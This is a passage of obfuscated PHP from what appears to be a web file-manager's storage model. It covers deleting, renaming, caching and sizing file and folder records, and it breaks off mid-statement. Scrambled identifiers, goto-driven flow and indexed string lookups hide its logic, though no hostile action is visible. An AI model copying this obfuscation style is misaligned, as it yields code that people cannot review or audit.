Model($a“î³½ãè›[2351])->where($a§º¿¨Êéª)->delete(); Model($a“î³½ãè›[505])->where($a§º¿¨Êéª)->delete(); Model($a“î³½ãè›[2076])->removeBySource($D¿‡ÈÎ˜); goto aŸ¿²™´Œİ; e±Ìî‰ÊßÌ: $D¿‡ÈÎ˜ = array_unique(array_filter($D¿‡ÈÎ˜)); $BŠµĞÇœˆ = array_unique(array_filter($BŠµĞÇœˆ)); if (!$D¿‡ÈÎ˜) { return !1; } goto aÆÏâµ¾›ô; aÆÏâµ¾›ô: $a§º¿¨Êéª = array($a“î³½ãè›[383] => array($a“î³½ãè›[384], $D¿‡ÈÎ˜)); Model($a“î³½ãè›[2348])->where($a§º¿¨Êéª)->delete(); Model($a“î³½ãè›[413])->where($a§º¿¨Êéª)->delete(); goto DÀ¶´¤×µ¯; aŸ¿²™´Œİ: Model($a“î³½ãè›[2329])->removeBySource($D¿‡ÈÎ˜); $this->where($a§º¿¨Êéª)->delete(); Model($a“î³½ãè›[422])->remove($BŠµĞÇœˆ); goto BïÅ‡ÂÔ´œ; BïÅ‡ÂÔ´œ: for ($Eæ²ÚÚ‡· = 0; $Eæ²ÚÚ‡· < count($D¿‡ÈÎ˜); $Eæ²ÚÚ‡·++) { $this->sourceCacheClear($D¿‡ÈÎ˜[$Eæ²ÚÚ‡·]); } goto aŒß“—Éİã; bÖœÄÃÈñ±: $a“î³½ãè› =& $_SERVER[îÖ]; $D¿‡ÈÎ˜ = $D¿‡ÈÎ˜ ? $D¿‡ÈÎ˜ : array(); $BŠµĞÇœˆ = $BŠµĞÇœˆ ? $BŠµĞÇœˆ : array(); goto e±Ìî‰ÊßÌ; aŒß“—Éİã: } public function rename($AŒÚ’½¹Å, $b£î£Àâêå) { goto d‚Ô·ŒÆÉ¸; FïßÙİöàÊ: $this->setNamePinyin($AŒÚ’½¹Å, $cÆÇ­²§ÏÄ[$BŒèğùªÉ®[28]], !1); $this->updateModifyTime($B×­±›¬ÃÓ[$BŒèğùªÉ®[461]]); $DË“ÄºîÎ = $this->where(array($BŒèğùªÉ®[383] => $AŒÚ’½¹Å))->data($cÆÇ­²§ÏÄ)->save(); goto aõŠŸ˜²Ğœ; d‚Ô·ŒÆÉ¸: $BŒèğùªÉ® =& $_SERVER[îÖ]; $B×­±›¬ÃÓ = $this->sourceInfo($AŒÚ’½¹Å); if (!$B×­±›¬ÃÓ) { return !1; } goto b·Ëó½ø×ª; bŞ–àî“ï: if (!$B×­±›¬ÃÓ[$BŒèğùªÉ®[370]] == $BŒèğùªÉ®[83]) { $cÆÇ­²§ÏÄ[$BŒèğùªÉ®[372]] = get_path_ext($b£î£Àâêå); } Model($BŒèğùªÉ®[505])->eventRename($AŒÚ’½¹Å, $B×­±›¬ÃÓ[$BŒèğùªÉ®[28]], $b£î£Àâêå); $this->sourceCacheClear($AŒÚ’½¹Å); goto FïßÙİöàÊ; b·Ëó½ø×ª: $f¹ƒœˆÂ‰  = $this->fileNameExist($B×­±›¬ÃÓ[$BŒèğùªÉ®[461]], $b£î£Àâêå); if ($f¹ƒœˆÂ‰ ) { return !1; } $cÆÇ­²§ÏÄ = array($BŒèğùªÉ®[386] => $b£î£Àâêå, $BŒèğùªÉ®[524] => USER_ID); goto bŞ–àî“ï; aõŠŸ˜²Ğœ: $fÃòæ‘ß« = $BŒèğùªÉ®[2337] . $B×­±›¬ÃÓ[$BŒèğùªÉ®[461]]; if (isset(self::$cacheChildList[$fÃòæ‘ß«])) { unset(self::$cacheChildList[$fÃòæ‘ß«]); } return $DË“ÄºîÎ; goto fÁå÷ÔŠŸ¢; fÁå÷ÔŠŸ¢: } public function setNamePinyin($D­ÌÚÜŠò, $bÆª…å›«, $Dº”ëèÖ° = true) { $BƒŞÖÁÕ†Ñ =& $_SERVER[îÖ]; $cÛíÖø± = Input::check($bÆª…å›«, $BƒŞÖÁÕ†Ñ[528]); if ($Dº”ëèÖ° && !$cÛíÖø±) { return; } if (!$cÛíÖø±) { $this->metaSet($D­ÌÚÜŠò, $BƒŞÖÁÕ†Ñ[416], null); $this->metaSet($D­ÌÚÜŠò, $BƒŞÖÁÕ†Ñ[415], null); return; } $Bñã«ğÃœ = array($BƒŞÖÁÕ†Ñ[416] => str_replace($BƒŞÖÁÕ†Ñ[50], $BƒŞÖÁÕ†Ñ[33], Pinyin::encode($bÆª…å›«)), $BƒŞÖÁÕ†Ñ[415] => Pinyin::encode($bÆª…å›«, $BƒŞÖÁÕ†Ñ[529])); $this->metaSet($D­ÌÚÜŠò, $Bñã«ğÃœ); } public function getContent($a—Õ”Şİ™’) { goto d’˜ŞÓ•ô; d’˜ŞÓ•ô: $D•ĞÇÎŒ² =& $_SERVER[îÖ]; $a³Ç±›Ş” = $this->fileInfoGet($a—Õ”Şİ™’); if (!$a³Ç±›Ş”) { return !1; } goto a¹ÉŒ»‘ù; a¹ÉŒ»‘ù: if ($a³Ç±›Ş”[$D•ĞÇÎŒ²[77]] == 0) { return $D•ĞÇÎŒ²[33]; } $F†˜òˆŸ = $D•ĞÇÎŒ²[2352] . $a³Ç±›Ş”[$D•ĞÇÎŒ²[163]]; if ($a³Ç±›Ş”[$D•ĞÇÎŒ²[77]] <= 1024 * 10) { $dÚÒñ‰ã“ = Cache::get($F†˜òˆŸ); if (!$dÚÒñ‰ã“) { $dÚÒñ‰ã“ = IO::getContent($a³Ç±›Ş”[$D•ĞÇÎŒ²[75]]); Cache::set($F†˜òˆŸ, $dÚÒñ‰ã“); } return $dÚÒñ‰ã“; } goto B¦ïåÌ„˜; B¦ïåÌ„˜: return IO::getContent($a³Ç±›Ş”[$D•ĞÇÎŒ²[75]]); goto dØõÇ•õ¡; dØõÇ•õ¡: } public function setDesc($BçÑÕ‰­‘¿, $bùÇ—©ƒá) { $FÍ­ÇƒÖä† =& $_SERVER[îÖ]; Model($FÍ­ÇƒÖä†[505])->eventAddDesc($BçÑÕ‰­‘¿, $bùÇ—©ƒá); return $this->metaSet($BçÑÕ‰­‘¿, $FÍ­ÇƒÖä†[405], $bùÇ—©ƒá); } public function setContent($a÷µÈª‘’¸, $FğªªÛ¾İÆ = '') { goto c—º†Ë“ß¶; A×—š‰ÒîÎ: if (!$FÇÈ½ÓÂ || !$eÑ¡æƒÓâô) { return !1; } $CÀ»Ê¤Óğ¸ = Model($eæá¾ËÒâƒ[422])->addFileByContent($FğªªÛ¾İÆ, $eÑ¡æƒÓâô[$eæá¾ËÒâƒ[28]]); $D‚—Ï²Š²è = $this->fileHistory($eÑ¡æƒÓâô, $CÀ»Ê¤Óğ¸[$eæá¾ËÒâƒ[419]], $CÀ»Ê¤Óğ¸[$eæá¾ËÒâƒ[77]]); goto c©Ê†ÜÔ °; c—º†Ë“ß¶: $eæá¾ËÒâƒ =& $_SERVER[îÖ]; $eÑ¡æƒÓâô = $this->sourceInfo($a÷µÈª‘’¸); $FÇÈ½ÓÂ = $this->fileInfoGet($a÷µÈª‘’¸); goto A×—š‰ÒîÎ; c©Ê†ÜÔ °: if (!$D‚—Ï²Š²è) { return Model($eæá¾ËÒâƒ[422])->remove($CÀ»Ê¤Óğ¸[$eæá¾ËÒâƒ[419]]); } $this->folderSizeReset($eÑ¡æƒÓâô[$eæá¾ËÒâƒ[461]]); return !0; goto Eá›‘¿ÜÀ; Eá›‘¿ÜÀ: } public function fileSubstr($e›°”ğ‚Ç, $B“²¿’Ñê±, $bÅŸ°“îÉ¾) { $B’¿ççòºö = $this->fileInfoGet($e›°”ğ‚Ç); if (!$B’¿ççòºö) { return !1; } return IO::fileSubstr($B’¿ççòºö[$_SERVER[îÖ][75]], $B“²¿’Ñê±, $bÅŸ°“îÉ¾); } public function fileInfoGet($BŸ¢‡åèœ¯) { goto B•”½Æôáƒ; B•”½Æôáƒ: $a¼×ß¼ŞÒ =& $_SERVER[îÖ]; $aèÍßƒ†Á = $this->sourceInfo($BŸ¢‡åèœ¯); if (!$aèÍßƒ†Á || $aèÍßƒ†Á[$a¼×ß¼ŞÒ[370]]) { return !1; } goto d¸‹Âé¨¯ğ; d¸‹Âé¨¯ğ: $cÏ‹ì¢î‡Ÿ = $a¼×ß¼ŞÒ[425] . $aèÍßƒ†Á[$a¼×ß¼ŞÒ[419]]; $DàƒÀï„…… = _get(self::$cacheFileInfo, $cÏ‹ì¢î‡Ÿ); if ($DàƒÀï„……) { return $DàƒÀï„……; } goto e”Ü‰¸º‡Å; b¥›Ãæ‘Ñ: return $D˜°£‚ñ ; goto C³óŒÅàšÑ; e”Ü‰¸º‡Å: $D˜°£‚ñ  = Model($a¼×ß¼ŞÒ[422])->fileInfo($aèÍßƒ†Á[$a¼×ß¼ŞÒ[419]]); if ($D˜°£‚ñ ) { $D˜°£‚ñ [$a¼×ß¼ŞÒ[28]] = $aèÍßƒ†Á[$a¼×ß¼ŞÒ[28]]; } self::$cacheFileInfo[$cÏ‹ì¢î‡Ÿ] = $D˜°£‚ñ ; goto b¥›Ãæ‘Ñ; C³óŒÅàšÑ: } private function folderChildrenNumber($C˜ƒÏ—Ã) { $A÷‘È¬…‰¬ =& $_SERVER[îÖ]; $d‚¦‚Åèº = $this->sourceInfo($C˜ƒÏ—Ã); $a¥‰ñÈ·ğ = array($A÷‘È¬…‰¬[525] => array($A÷‘È¬…‰¬[483], $d‚¦‚Åèº[$A÷‘È¬…‰¬[459]] . $C˜ƒÏ—Ã . $A÷‘È¬…‰¬[484]), $A÷‘È¬…‰¬[396] => intval($d‚¦‚Åèº[$A÷‘È¬…‰¬[397]]), $A÷‘È¬…‰¬[518] => 1); $C·Ğ¦ç×Ù³ = $this->where($a¥‰ñÈ·ğ)->count(); $aÃ¥¾ª›‚œ = $this->where($a¥‰ñÈ·ğ)->where(array($A÷‘È¬…‰¬[518] => 0))->count(); return array($A÷‘È¬…‰¬[81] => $aÃ¥¾ª›‚œ, $A÷‘È¬…‰¬[82] => $C·Ğ¦ç×Ù³); } public function pathInfo($BøÌ®°óñÁ, $B£¼±ç×ã = false) { goto C…Œ§ğ÷è°; E›¿Î¾ˆº: if ($FÅÌ§»è©å) { return $FÅÌ§»è©å; } $b¦ê¯ùƒí… = $this->sourceInfo($BøÌ®°óñÁ); if (!$b¦ê¯ùƒí…) { return !1; } goto C…ê§ŠáË˜; C…ê§ŠáË˜: $b¦ê¯ùƒí… = $this->_listDataApplyItem($b¦ê¯ùƒí…, $B£¼±ç×ã); self::$cachePathInfo[$f†Í‰ñ§É] = $b¦ê¯ùƒí…; return $b¦ê¯ùƒí…; goto DèïÅÊò„«; C…Œ§ğ÷è°: $d¬Ìõœğ¶“ =& $_SERVER[îÖ]; $f†Í‰ñ§É = $d¬Ìõœğ¶“[411] . intval($B£¼±ç×ã) . $d¬Ìõœğ¶“[412] . $BøÌ®°óñÁ; $FÅÌ§»è©å = _get(self::$cachePathInfo, $f†Í‰ñ§É); goto E›¿Î¾ˆº; DèïÅÊò„«: } public static $cachePathInfoMore = array(); public function pathInfoMore($BáÁÓ‚íÄ‚) { goto BİŒÓèÚÜã; BİŒÓèÚÜã: $DÌƒÀ‹Û =& $_SERVER[îÖ]; $A®®óÔˆÉí = _get(self::$cachePathInfoMore, $BáÁÓ‚íÄ‚); if ($A®®óÔˆÉí) { return $A®®óÔˆÉí; } goto Fè›÷Á•âÕ; B¸çÎ­³á¥: self::$cachePathInfoMore[$BáÁÓ‚íÄ‚] = $Díƒ…ï¹½; return $Díƒ…ï¹½; goto a¸Ã‰Ì±Öá; Fè›÷Á•âÕ: $Díƒ…ï¹½ = $this->pathInfo($BáÁÓ‚íÄ‚); if (!$Díƒ…ï¹½) { return !1; } if ($Díƒ…ï¹½[$DÌƒÀ‹Û[370]] == $DÌƒÀ‹Û[83]) { $Díƒ…ï¹½[$DÌƒÀ‹Û[80]] = $this->folderChildrenNumber($BáÁÓ‚íÄ‚); } goto B¸çÎ­³á¥; a¸Ã‰Ì±Öá: } public function sourceInfo($B”Ä–‡´¢ä) { goto a¼¡óÙ‘é; fíÜ®±‡±’: $b›ŒŠ÷¿¥ = _get(self::$cacheSourceInfo, $EìÉù³…‹Î); if ($b›ŒŠ÷¿¥) { return $b›ŒŠ÷¿¥; } $Dé†èìßÊ = $this->where(array($cÔÁ×Ç˜¦¢[369] => $B”Ä–‡´¢ä))->find(); goto C£­‘”šß˜; a¼¡óÙ‘é: $cÔÁ×Ç˜¦¢ =& $_SERVER[îÖ]; if (!$B”Ä–‡´¢ä) { return array(); } $EìÉù³…‹Î = $cÔÁ×Ç˜¦¢[410] . $B”Ä–‡´¢ä; goto fíÜ®±‡±’; C£­‘”šß˜: self::$cacheSourceInfo[$EìÉù³…‹Î] = $Dé†èìßÊ; return self::$cacheSourceInfo[$EìÉù³…‹Î]; goto e³¦®ºî¯; e³¦®ºî¯: } public function sourceCacheClear($FÉòî¯éÆ† = false) { if ($FÉòî¯éÆ† == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[îÖ][410] . $FÉòî¯éÆ†]); } public function pathInfoByPath($FÀ²Ü‰ÍÊ–, $BĞÍáŞà—) { $c¤ÉË·•â =& $_SERVER[îÖ]; $C†ù…™Ê = !$BĞÍáŞà— ? array() : explode($c¤ÉË·•â[8], trim($BĞÍáŞà—, $c¤ÉË·•â[8])); $aö§‡°×¦Á = $FÀ²Ü‰ÍÊ–; foreach ($C†ù…™Ê as $CèÆ…à¥Êù) { $BéõŞÆåÍ = array($c¤ÉË·•â[461] => $aö§‡°×¦Á, $c¤ÉË·•â[28] => $CèÆ…à¥Êù); $DÒ”áŸõµ = $this->where($BéõŞÆåÍ)->select(); if (!$DÒ”áŸõµ) { return !1; } $DÒ”áŸõµ = array_sort_by($DÒ”áŸõµ, $c¤ÉË·•â[397]); $aö§‡°×¦Á = $DÒ”áŸõµ[0][$c¤ÉË·•â[369]]; } return $this->pathInfo($aö§‡°×¦Á, !0); } protected function updateModifyTime($E¯‚Ú¶å®) { goto eËçË„ÁÚ‘; A‹˜åÇİ : $this->where($BêÚ»ä¤Ú‡)->save($c³¿ˆ¨Ú¿); goto C¹ĞÇˆÍÅ; eËçË„ÁÚ‘: $e¸İ¢ğÕ¢ =& $_SERVER[îÖ]; if (!$E¯‚Ú¶å®) { return; } if (!is_array($E¯‚Ú¶å®)) { $E¯‚Ú¶å® = array($E¯‚Ú¶å®); } goto A­Ğ®Ù¦Î; A­Ğ®Ù¦Î: foreach ($E¯‚Ú¶å® as $Còõá´Ú®Ÿ => $fµë¦§²§) { $E¯‚Ú¶å®[$Còõá´Ú®Ÿ] = intval($fµë¦§²§); } $BêÚ»ä¤Ú‡ = array($e¸İ¢ğÕ¢[369] => array($e¸İ¢ğÕ¢[7], $E¯‚Ú¶å®)); $c³¿ˆ¨Ú¿ = array($e¸İ¢ğÕ¢[524] => USER_ID, $e¸İ¢ğÕ¢[390] => time()); goto A‹˜åÇİ ; C¹ĞÇˆÍÅ: } public function folderSizeReset($Cõä§ªßİ…) { goto C„ğÀĞÏ£—; c„ª·Òæ´…: $fÚÌÚ’¹İ = $cô¢¤ô®Ê - intval($F›¤›Š‘ÇÃ[$A·ÉˆÂ÷´Ö[77]]); if ($fÚÌÚ’¹İ == 0) { return CacheLock::unlock($a§Œí‡Ù‹); } $this->where(array($A·ÉˆÂ÷´Ö[383] => $Cõä§ªßİ…))->setField($A·ÉˆÂ÷´Ö[77], $cô¢¤ô®Ê); goto D´Òå„ïÍ‹; AÚÅ˜„ùÍé: $fì¾²´íÛ² = array($A·ÉˆÂ÷´Ö[368] => $Cõä§ªßİ…, $A·ÉˆÂ÷´Ö[396] => 0); $cô¢¤ô®Ê = $this->where($fì¾²´íÛ²)->sum($A·ÉˆÂ÷´Ö[77]); $cô¢¤ô®Ê = intval($cô¢¤ô®Ê); goto c„ª·Òæ´…; dç¦µèŠì•: CacheLock::unlock($a§Œí‡Ù‹); goto a‰õÔÓÉ; f¨â¨†Èµ†: CacheLock::lock($a§Œí‡Ù‹, 20); $this->sourceCacheClear($Cõä§ªßİ…); $F›¤›Š‘ÇÃ = $this->sourceInfo($Cõä§ªßİ…); goto AÚÅ˜„ùÍé; D´Òå„ïÍ‹: $E›Æáß§¹ = $this->parentLevelArray($F›¤›Š‘ÇÃ[$A·ÉˆÂ÷´Ö[459]]); if ($E›Æáß§¹) { $fì¾²´íÛ² = array($A·ÉˆÂ÷´Ö[369] => array($A·ÉˆÂ÷´Ö[384], $E›Æáß§¹)); if ($fÚÌÚ’¹İ < 0) { $fì¾²´íÛ²[$A·ÉˆÂ÷´Ö[77]] = array($A·ÉˆÂ÷´Ö[923], abs($fÚÌÚ’¹İ)); } $this->where($fì¾²´íÛ²)->setAdd($A·ÉˆÂ÷´Ö[77], $fÚÌÚ’¹İ); } $this->targetSpaceUpdate($F›¤›Š‘ÇÃ[$A·ÉˆÂ÷´Ö[371]], $F›¤›Š‘ÇÃ[$A·ÉˆÂ÷´Ö[456]]); goto dç¦µèŠì•; C„ğÀĞÏ£—: $A·ÉˆÂ÷´Ö =& $_SERVER[îÖ]; if ($this->statusIgnoreResetSpace) { return; } $a§Œí‡Ù‹ = $A·ÉˆÂ÷´Ö[2353] . $Cõä§ªßİ…; goto f¨â¨†Èµ†; a‰õÔÓÉ: } public function folderSizeResetChildren($eîš‘ö™õ£) { goto CØÎè‡Æ¬ª; dšŸ»„…ù: foreach ($a¦Ñ©©ÌÀ± as $D–ê›•É¦) { if ($D–ê›•É¦[$CÈã¼»¢„[77]] == $D–ê›•É¦[$CÈã¼»¢„[2355]]) { continue; } $C”©»î©†[] = array($CÈã¼»¢„[369], $D–ê›•É¦[$CÈã¼»¢„[369]], $CÈã¼»¢„[77], $D–ê›•É¦[$CÈã¼»¢„[77]]); } $this->saveAll($C”©»î©†); goto B¨‰”‚¨³ß; CØÎè‡Æ¬ª: $CÈã¼»¢„ =& $_SERVER[îÖ]; $this->sourceCacheClear($eîš‘ö™õ£); $a¦¹–öâÛË = $this->sourceInfo($eîš‘ö™õ£); goto D…·Ìƒ÷‚Ò; eÌÜî¬Õ‰Í: foreach ($CæÍÍí×êå as $D–ê›•É¦) { $FÌ—­Öƒ–¡ = $D–ê›•É¦[$CÈã¼»¢„[461]] . $CÈã¼»¢„[33]; if (!isset($a¦Ñ©©ÌÀ±[$FÌ—­Öƒ–¡])) { continue; } if ($D–ê›•É¦[$CÈã¼»¢„[397]] == $a¦Ñ©©ÌÀ±[$FÌ—­Öƒ–¡][$CÈã¼»¢„[397]]) { $a¦Ñ©©ÌÀ±[$FÌ—­Öƒ–¡][$CÈã¼»¢„[77]] += $D–ê›•É¦[$CÈã¼»¢„[77]]; } } foreach ($a¦Ñ©©ÌÀ± as $D–ê›•É¦) { $bïìÕß©ÈŒ = $this->parentLevelArray($D–ê›•É¦[$CÈã¼»¢„[459]]); foreach ($bïìÕß©ÈŒ as $FÌ—­Öƒ–¡) { $FÌ—­Öƒ–¡ = $FÌ—­Öƒ–¡ . $CÈã¼»¢„[33]; if (!isset($a¦Ñ©©ÌÀ±[$FÌ—­Öƒ–¡])) { continue; } if ($D–ê›•É¦[$CÈã¼»¢„[397]] == $a¦Ñ©©ÌÀ±[$FÌ—­Öƒ–¡][$CÈã¼»¢„[397]]) { $a¦Ñ©©ÌÀ±[$FÌ—­Öƒ–¡][$CÈã¼»¢„[77]] += $D–ê›•É¦[$CÈã¼»¢„[77]]; } } } $C”©»î©† = array(); goto dšŸ»„…ù; D…·Ìƒ÷‚Ò: $E•’ø¶ Ü• = array($CÈã¼»¢„[518] => 1, $CÈã¼»¢„[525] => array($CÈã¼»¢„[483], $a¦¹–öâÛË[$CÈã¼»¢„[459]] . $eîš‘ö™õ£ . $CÈã¼»¢„[484])); $e™Äˆ“îÌÈ = $CÈã¼»¢„[2354]; $a¦Ñ©©ÌÀ± = $this->field($e™Äˆ“îÌÈ)->where($E•’ø¶ Ü•)->select(); goto a„•¹öÅ‰…; a„•¹öÅ‰…: $E•’ø¶ Ü•[$CÈã¼»¢„[370]] = 0; $CæÍÍí×êå = $this->field($e™Äˆ“îÌÈ)->where($E•’ø¶ Ü•)->select(); if (!$CæÍÍí×êå) { return; } goto dÖŒ£©šï; dÖŒ£©šï: $a¦Ñ©©ÌÀ±[] = $a¦¹–öâÛË; $a¦Ñ©©ÌÀ± = array_to_keyvalue($a¦Ñ©©ÌÀ±, $CÈã¼»¢„[369]); foreach ($a¦Ñ©©ÌÀ± as $bµÀÉƒÅ‹õ => $D–ê›•É¦) { $a¦Ñ©©ÌÀ±[$bµÀÉƒÅ‹õ][$CÈã¼»¢„[2355]] = $a¦Ñ©©ÌÀ±[$bµÀÉƒÅ‹õ][$CÈã¼»¢„[77]]; $a¦Ñ©©ÌÀ±[$bµÀÉƒÅ‹õ][$CÈã¼»¢„[77]] = 0; } goto eÌÜî¬Õ‰Í; B¨‰”‚¨³ß: } public function userSpaceReset($Dæí©ùµ¯ = false) { $e¹­ƒÓõ¨Ÿ =& $_SERVER[îÖ]; $F¿›¶Â¾ = $this->where(array($e¹­ƒÓõ¨Ÿ[371] => self::TYPE_USER, $e¹­ƒÓõ¨Ÿ[456] => $Dæí©ùµ¯, $e¹­ƒÓõ¨Ÿ[370] => 0))->sum($e¹­ƒÓõ¨Ÿ[77]); Model($e¹­ƒÓõ¨Ÿ[474])->userEdit($Dæí©ùµ¯, array($e¹­ƒÓõ¨Ÿ[2085] => $F¿›¶Â¾)); } public function targetSpaceUpdate($f¡¢Â²œ˜¹, $Cïà¤§äĞÈ) { $eÂó‡°•Àµ =& $_SERVER[îÖ]; if (!$Cïà¤§äĞÈ) { return; } if (!in_array($f¡¢Â²œ˜¹, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $E¸ëãÅ· = $this->targetSpaceSize($f¡¢Â²œ˜¹, $Cïà¤§äĞÈ); if ($f¡¢Â²œ˜¹ == self::TYPE_USER) { Model($eÂó‡°•Àµ[474])->userEdit($Cïà¤§äĞÈ, array($eÂó‡°•Àµ[2085] => $E¸ëãÅ·)); } else { if ($f¡¢Â²œ˜¹ == self::TYPE_GROUP) { Model($eÂó‡°•Àµ[458])->groupEdit($Cïà¤§äĞÈ, array($eÂó‡°•Àµ[2085] => $E¸ëãÅ·)); } } } public function targetSpaceSize($EÁ²ê¼¸İ, $F¹©¸ß¥ôÆ) { goto Fİ­óœÓ»; Fİ­óœÓ»: $Cñ”Åß‚£ë =& $_SERVER[îÖ]; $añëĞË‘Æğ = $this->sourceRoot($EÁ²ê¼¸İ, $F¹©¸ß¥ôÆ, !0); if (!$añëĞË‘Æğ) { return 0; } goto B¼ïóÒ›–â; CšÅÚò×Õé: return $E§í·˜‰¥Ã; goto F§ÕÊÛÔ¨˜; B¼ïóÒ›–â: $E§í·˜‰¥Ã = floatval($añëĞË‘Æğ[$Cñ”Åß‚£ë[77]]); $aôöÀ²ğõÎ = array($Cñ”Åß‚£ë[525] => array($Cñ”Åß‚£ë[483], $Cñ”Åß‚£ë[470] . $añëĞË‘Æğ[$Cñ”Åß‚£ë[369]] . $Cñ”Åß‚£ë[484])); $aŞ¼®²Â‚ˆ = Model($Cñ”Åß‚£ë[395])->field($Cñ”Åß‚£ë[383])->where($aôöÀ²ğõÎ)->select(); goto Fä’òÓÍÊ‚; Fä’òÓÍÊ‚: $aŞ¼®²Â‚ˆ = array_to_keyvalue($aŞ¼®²Â‚ˆ, $Cñ”Åß‚£ë[33], $Cñ”Åß‚£ë[369]); $aŞ¼®²Â‚ˆ = array_unique(array_filter($aŞ¼®²Â‚ˆ)); if ($aŞ¼®²Â‚ˆ) { $aôöÀ²ğõÎ = array($Cñ”Åß‚£ë[383] => array($Cñ”Åß‚£ë[384], $aŞ¼®²Â‚ˆ)); $E§í·˜‰¥Ã += floatval($this->where($aôöÀ²ğõÎ)->sum($Cñ”Åß‚£ë[77])); } goto CšÅÚò×Õé; F§ÕÊÛÔ¨˜: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($få¤î¹ŒÄ) { return $this->fileTypeProfile($få¤î¹ŒÄ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($f¹Â²¦ºèÏ) { return $this->fileTypeProfile($f¹Â²¦ºèÏ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($F¿„Ú‚Æ÷, $bÛˆöåæµ…) { goto DØõ«ŒÅ‹; dĞåÖ×Ç è: $B»øÔ¡¢çï = array(); $B»øÔ¡¢çï[$DÉó­ •“‡[2357]] = array($DÉó­ •“‡[2358] => LNG($DÉó­ •“‡[2357]), $DÉó­ •“‡[2359] => $this->where($C×ãÇÖ«í)->count(), $DÉó­ •“‡[520] => $this->where($C×ãÇÖ«í)->sum($DÉó­ •“‡[77])); $E›Â¥Ú× = KodIO::fileTypeList(); goto dÌ¦ƒÀÌ¯ô; dÌ¦ƒÀÌ¯ô: foreach ($E›Â¥Ú× as $D¡²…¹ ³Ò => $E¼À™†ïÙ’) { $C×ãÇÖ«í[$DÉó­ •“‡[372]] = $this->fileTypeWhere($D¡²…¹ ³Ò); $B»øÔ¡¢çï[$D¡²…¹ ³Ò] = array($DÉó­ •“‡[2358] => $E¼À™†ïÙ’[$DÉó­ •“‡[28]], $DÉó­ •“‡[2359] => $this->where($C×ãÇÖ«í)->count(), $DÉó­ •“‡[520] => $this->where($C×ãÇÖ«í)->sum($DÉó­ •“‡[77])); } Cache::set($bŸÙíëÁô, $B»øÔ¡¢çï, 1200); return $B»øÔ¡¢çï; goto E²¶¨Ï§à­; DØõ«ŒÅ‹: $DÉó­ •“‡ =& $_SERVER[îÖ]; $bŸÙíëÁô = $DÉó­ •“‡[2356] . $F¿„Ú‚Æ÷ . $DÉó­ •“‡[70] . $bÛˆöåæµ…; $D°ùÁáÛ½ï = Cache::get($bŸÙíëÁô); goto E¤Ğ©ÓÅ; E¤Ğ©ÓÅ: if ($D°ùÁáÛ½ï) { return $D°ùÁáÛ½ï; } $C×ãÇÖ«í = array($DÉó­ •“‡[518] => 0); if ($F¿„Ú‚Æ÷ != !1) { $C×ãÇÖ«í[$DÉó­ •“‡[456]] = $F¿„Ú‚Æ÷; $C×ãÇÖ«í[$DÉó­ •“‡[371]] = $bÛˆöåæµ…; } goto dĞåÖ×Ç è; E²¶¨Ï§à­: } public function fileNameExist($bÇ´´ŠØ , $DìˆŞ§”Ü­) { $fïÚ ƒ§à =& $_SERVER[îÖ]; $fİ¬Ï‰Ú†Ü = $this->childList($bÇ´´ŠØ ); foreach ($fİ¬Ï‰Ú†Ü as $c±Íâ³çäÑ) { if ($c±Íâ³çäÑ[$fïÚ ƒ§à[28]] == $DìˆŞ§”Ü­) { return $c±Íâ³çäÑ[$fïÚ ƒ§à[369]]; } } return !1; } public function childList($A¦ìÕ‹—õÕ) { goto A£Á™¤†ƒË; E´Ó—ß¸†à: self::$cacheChildList[$C„†ÜÎ†‚š] = $bê‹·”Ò®ö; foreach ($bê‹·”Ò®ö as $eÖĞè˜ßÍ¼) { $C„†ÜÎ†‚š = $FÏëêî¨š¾[410] . $eÖĞè˜ßÍ¼[$FÏëêî¨š¾[369]]; self::$cacheSourceInfo[$C„†ÜÎ†‚š] = $eÖĞè˜ßÍ¼; } return $bê‹·”Ò®ö; goto FÊçŠ†İ¥‹; A£Á™¤†ƒË: $FÏëêî¨š¾ =& $_SERVER[îÖ]; $C„†ÜÎ†‚š = $FÏëêî¨š¾[2337] . $A¦ìÕ‹—õÕ; if (isset(self::$cacheChildList[$C„†ÜÎ†‚š])) { return self::$cacheChildList[$C„†ÜÎ†‚š]; } goto cˆ÷ÏãéÀ; cˆ÷ÏãéÀ: $Eù‹åºîµ = array($FÏëêî¨š¾[461] => intval($A¦ìÕ‹—õÕ), $FÏëêî¨š¾[397] => 0); $bê‹·”Ò®ö = $this->where($Eù‹åºîµ)->select(); $bê‹·”Ò®ö = $bê‹·”Ò®ö ? $bê‹·”Ò®ö : array(); goto E´Ó—ß¸†à; FÊçŠ†İ¥‹: } public function fileNameAuto($d©æÃ›³©, $f•ƒ’ÒÏŒ¯, $F¨ªÅóŠÔ = REPEAT_RENAME, $EÎ²êĞÌ› = false) { $E÷£Ä”×ë¤ =& $_SERVER[îÖ]; $A¢õá‚ÁöÕ = $this->childList($d©æÃ›³©); $c·‹§æ¾¾Ï = array_to_keyvalue($A¢õá‚ÁöÕ, $E÷£Ä”×ë¤[33], $E÷£Ä”×ë¤[28]); return $this->fileNameAutoGet($c·‹§æ¾¾Ï, $f•ƒ’ÒÏŒ¯, $F¨ªÅóŠÔ, $EÎ²êĞÌ›); } public function fileNameAutoGet($d—¬Âİ¯ÖÕ, $b¤Öñç¹ğ, $D´ÑµÍ×®, $CËßìÈˆ¹) { $E–Š¸—à =& $_SERVER[îÖ]; if ($D´ÑµÍ×® == REPEAT_REPLACE || !$d—¬Âİ¯ÖÕ || !in_array_not_case($b¤Öñç¹ğ, $d—¬Âİ¯ÖÕ) || $CËßìÈˆ¹ && $D´ÑµÍ×® != REPEAT_RENAME_FOLDER) { return $b¤Öñç¹ğ; } if ($D´ÑµÍ×® == REPEAT_SKIP) { return !1; } $A–‚ŒªÍø = $E–Š¸—à[91] . get_path_ext($b¤Öñç¹ğ); $A–‚ŒªÍø = $A–‚ŒªÍø == $E–Š¸—à[91] || $CËßìÈˆ¹ ? $E–Š¸—à[33] : $A–‚ŒªÍø; for ($B˜…åÆ³È™ = 1; $B˜…åÆ³È™ <= count($d—¬Âİ¯ÖÕ) + 1; $B˜…åÆ³È™++) { $C‹ÔÊè©á× = substr($b¤Öñç¹ğ, 0, strlen($b¤Öñç¹ğ) - strlen($A–‚ŒªÍø)); $a­ê¦¤¶«ˆ = $C‹ÔÊè©á× . 